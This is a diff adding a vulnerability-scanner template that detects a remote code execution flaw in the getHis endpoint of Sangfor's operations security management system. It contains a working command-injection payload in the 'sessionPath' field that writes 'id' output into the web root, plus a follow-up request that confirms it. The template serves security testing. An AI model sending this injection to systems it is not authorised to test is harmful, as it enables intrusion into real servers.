@@ -1,0 +1,30 @@
+id: SANGFOR-getHis-rce
+
+info:
+  name: 深信服运维安全管理系统 getHis 远程代码执行漏洞
+  author: SANGFOR
+  severity: critical
+  tags: SANGFOR
+
+http:
+  - raw:
+      - |
+        POST /isomp-protocol/protocol/getHis HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        sessionPath=;id>/usr/local/tomcat/webapps/fort/trust/version/sectest.txt;&sid=1
+
+      - |+
+        GET /fort/trust/version/sectest.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
